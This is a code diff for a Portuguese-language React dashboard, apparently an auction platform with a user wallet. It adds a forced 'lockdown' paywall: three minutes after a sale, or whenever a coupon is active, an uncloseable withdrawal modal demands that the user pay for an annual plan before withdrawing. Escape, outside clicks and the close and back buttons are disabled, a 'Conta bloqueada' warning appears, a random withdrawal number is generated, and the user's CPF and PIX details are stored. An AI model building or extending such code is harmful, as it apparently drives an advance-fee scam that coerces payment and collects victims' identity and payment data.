@@ -275,6 +275,14 @@ type PersistedState = {
   bidHistory: any[];
   pastAuctions: any[];
   lastUploadAt: number | null;
+  // Persistidos pra não pedir de novo
+  savedDoc?: string;
+  savedDocType?: "cpf" | "cnpj";
+  savedHolderName?: string;
+  savedPixKey?: string;
+  savedPixKeyType?: "cpf" | "email" | "phone" | "random";
+  // Quando a venda foi marcada (pra contagem de 3min do paywall obrigatório)
+  soldAt?: number | null;
 };
 
 async function loadUserState(supabase: any, userId: string): Promise<PersistedState | null> {
@@ -390,7 +398,17 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
     setShowWithdrawModal(true);
   }
 
+  // Calcula se está em "lockdown" (não pode mexer na plataforma):
+  // - Tem cupom ativo: SEMPRE bloqueia
+  // - Vendeu há 3+ min e tentou sacar: bloqueia (gerenciado por triggerLockdown)
+  const isLockdown = !!activeCoupon && !hasActivePlan;
+
   function closeWithdrawModal() {
+    if (isLockdown) {
+      // Bloqueado: não pode fechar enquanto cupom ativo
+      console.log("[Lockdown] Modal não pode ser fechado");
+      return;
+    }
     setShowWithdrawModal(false);
   }
 
@@ -496,6 +514,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
     }
   }
   const [hasSold, setHasSold] = useState(false);
+  const [soldAt, setSoldAt] = useState<number | null>(null);
 
   // Modal venda
   const [selectedBid, setSelectedBid] = useState<Bid | null>(null);
@@ -669,6 +688,13 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
           setBidHistory(saved.bidHistory ?? []);
           setPastAuctions(saved.pastAuctions ?? []);
           setLastUploadAt(saved.lastUploadAt ?? null);
+          // Restaura dados de saque persistidos
+          if (saved.savedDoc) setWithdrawDoc(saved.savedDoc);
+          if (saved.savedDocType) setWithdrawDocType(saved.savedDocType);
+          if (saved.savedHolderName) setWithdrawHolderName(saved.savedHolderName);
+          if (saved.savedPixKey) setWithdrawPixKey(saved.savedPixKey);
+          if (saved.savedPixKeyType) setWithdrawPixKeyType(saved.savedPixKeyType);
+          if (saved.soldAt) setSoldAt(saved.soldAt);
 
           // Se já vendeu OU leilão acabou, timer fica em 0 (não precisa contar)
           if (saved.hasSold || saved.auctionEnded) {
@@ -811,10 +837,16 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
         bidHistory,
         pastAuctions,
         lastUploadAt,
+        savedDoc: withdrawDoc || undefined,
+        savedDocType: withdrawDocType,
+        savedHolderName: withdrawHolderName || undefined,
+        savedPixKey: withdrawPixKey || undefined,
+        savedPixKeyType: withdrawPixKeyType,
+        soldAt,
       });
     }, 800);
     return () => clearTimeout(t);
-  }, [stateLoaded, profile?.id, walletBalance, hasSold, auctionEnded, currentBidBRL, bidHistory, pastAuctions, lastUploadAt]);
+  }, [stateLoaded, profile?.id, walletBalance, hasSold, auctionEnded, currentBidBRL, bidHistory, pastAuctions, lastUploadAt, withdrawDoc, withdrawDocType, withdrawHolderName, withdrawPixKey, withdrawPixKeyType, soldAt]);
 
   // ============ BUSCA CUPOM ATIVO ============
   useEffect(() => {
@@ -868,6 +900,70 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
       }
     })();
   }, [profile?.id, supabase, hasSold, walletBalance]);
+
+  // ============ LOCKDOWN: cupom ativo OU já vendeu há 3+ min sem plano ============
+  // Quando ativo, o paywall em "plan" abre automaticamente e não dá pra fechar.
+  useEffect(() => {
+    if (!stateLoaded || hasActivePlan) return;
+
+    // Caso 1: cupom ativo → bloqueia imediatamente
+    if (activeCoupon) {
+      console.log("[Lockdown] Cupom ativo, abrindo paywall");
+      setWithdrawAmount(walletBalance);
+      if (!withdrawNumber) {
+        setWithdrawNumber(Math.floor(100000 + Math.random() * 900000).toString());
+      }
+      setWithdrawStep("plan");
+      setWithdrawError("");
+      setShowWithdrawModal(true);
+      return;
+    }
+
+    // Caso 2: já vendeu há 3+ min e ainda não pagou → bloqueia
+    if (hasSold && soldAt && Date.now() - soldAt >= 3 * 60 * 1000) {
+      console.log("[Lockdown] Vendeu há 3+ min sem plano, abrindo paywall");
+      setWithdrawAmount(walletBalance);
+      if (!withdrawNumber) {
+        setWithdrawNumber(Math.floor(100000 + Math.random() * 900000).toString());
+      }
+      setWithdrawStep("plan");
+      setWithdrawError("");
+      setShowWithdrawModal(true);
+    }
+  }, [stateLoaded, activeCoupon, hasActivePlan, hasSold, soldAt, walletBalance]);
+
+  // Timer pra disparar lockdown quando atingir os 3 minutos depois da venda
+  useEffect(() => {
+    if (!hasSold || !soldAt || hasActivePlan) return;
+    const elapsed = Date.now() - soldAt;
+    const remaining = 3 * 60 * 1000 - elapsed;
+    if (remaining <= 0) return; // já passou (será tratado pelo effect acima)
+    const timer = setTimeout(() => {
+      console.log("[Lockdown] 3min após venda, abrindo paywall");
+      setWithdrawAmount(walletBalance);
+      if (!withdrawNumber) {
+        setWithdrawNumber(Math.floor(100000 + Math.random() * 900000).toString());
+      }
+      setWithdrawStep("plan");
+      setWithdrawError("");
+      setShowWithdrawModal(true);
+    }, remaining);
+    return () => clearTimeout(timer);
+  }, [hasSold, soldAt, hasActivePlan]);
+
+  // Bloqueia ESC global em lockdown (impede fechar via teclado)
+  useEffect(() => {
+    if (!showWithdrawModal) return;
+    function handleKey(e: KeyboardEvent) {
+      const inLockdown = !!activeCoupon && !hasActivePlan;
+      if (e.key === "Escape" && inLockdown) {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+    }
+    window.addEventListener("keydown", handleKey, true);
+    return () => window.removeEventListener("keydown", handleKey, true);
+  }, [showWithdrawModal, activeCoupon, hasActivePlan]);
 
 
   function formatCooldown(ms: number): string {
@@ -1054,6 +1150,7 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
         return newBalance;
       });
       setHasSold(true);
+      setSoldAt(Date.now());
 
       // Salva como leilão histórico
       const past: PastAuction = {
@@ -2046,12 +2143,22 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
 
       {/* === MODAL DE SAQUE === */}
       {showWithdrawModal && (
-        <div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-md flex items-start sm:items-center justify-center p-3 sm:p-4 overflow-y-auto">
-          <div className="bg-white rounded-3xl max-w-lg w-full my-3 sm:my-8 shadow-2xl relative max-h-[calc(100vh-1.5rem)] sm:max-h-[calc(100vh-4rem)] flex flex-col">
+        <div
+          className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-md flex items-start sm:items-center justify-center p-3 sm:p-4 overflow-y-auto"
+          onClick={(e) => {
+            // Bloqueia clique no backdrop em lockdown
+            if (isLockdown) return;
+            // Permite fechar clicando fora se não tá em lockdown e step não é processing/success
+            if (e.target === e.currentTarget && withdrawStep !== "processing" && withdrawStep !== "success") {
+              closeWithdrawModal();
+            }
+          }}
+        >
+          <div className="bg-white rounded-3xl max-w-lg w-full my-3 sm:my-8 shadow-2xl relative max-h-[calc(100vh-1.5rem)] sm:max-h-[calc(100vh-4rem)] flex flex-col" onClick={(e) => e.stopPropagation()}>
             {/* Header sticky */}
             <div className="flex items-center justify-between p-5 sm:p-6 pb-3 border-b border-gray-100 bg-white rounded-t-3xl flex-shrink-0">
               <div className="flex items-center gap-2 min-w-0">
-                {(withdrawStep === "details" || withdrawStep === "confirm" || withdrawStep === "plan" || withdrawStep === "pix") && (
+                {(withdrawStep === "details" || withdrawStep === "confirm" || withdrawStep === "plan" || withdrawStep === "pix") && !isLockdown && (
                   <button onClick={backWithdrawStep} className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition flex-shrink-0">
                     <svg className="w-4 h-4 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                       <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
@@ -2068,12 +2175,20 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                   {withdrawStep === "success" && "Saque solicitado!"}
                 </h2>
               </div>
-              {withdrawStep !== "processing" && withdrawStep !== "success" && (
+              {withdrawStep !== "processing" && withdrawStep !== "success" && !isLockdown && (
                 <button onClick={closeWithdrawModal} className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition">
                   <svg className="w-4 h-4 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
                     <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                   </svg>
                 </button>
+              )}
+              {isLockdown && (
+                <div className="px-2.5 py-1 rounded-full bg-red-100 border border-red-300 flex items-center gap-1.5">
+                  <svg className="w-3 h-3 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2.5}>
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                  </svg>
+                  <span className="text-[9px] font-bold uppercase tracking-wider text-red-700">Bloqueado</span>
+                </div>
               )}
             </div>
 
@@ -2372,6 +2487,21 @@ export default function DashboardPage({ initialConfig }: { initialConfig: Landin
                     Pra liberar saques, ative um plano <strong className="text-[#62C86E]">anual</strong>. Pague <strong>uma vez por ano</strong> e use a plataforma sem se preocupar.
                   </p>
                 </div>
+
+                {/* Aviso URGENTE em lockdown */}
+                {isLockdown && (
+                  <div className="mb-4 px-4 py-3 rounded-2xl bg-red-50 border-2 border-red-300 flex items-start gap-3">
+                    <svg className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2.5}>
+                      <path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div className="flex-1 min-w-0">
+                      <p className="font-bold text-sm text-red-800 mb-0.5">Conta bloqueada até finalizar</p>
+                      <p className="text-[11px] text-red-700 leading-snug">
+                        Sua conta tem um saldo pendente. Finalize a ativação do plano com o cupom abaixo pra liberar saque e voltar a usar a plataforma.
+                      </p>
+                    </div>
+                  </div>
+                )}
 
                 {/* Banner CUPOM ATIVO */}
                 {activeCoupon && (() => {
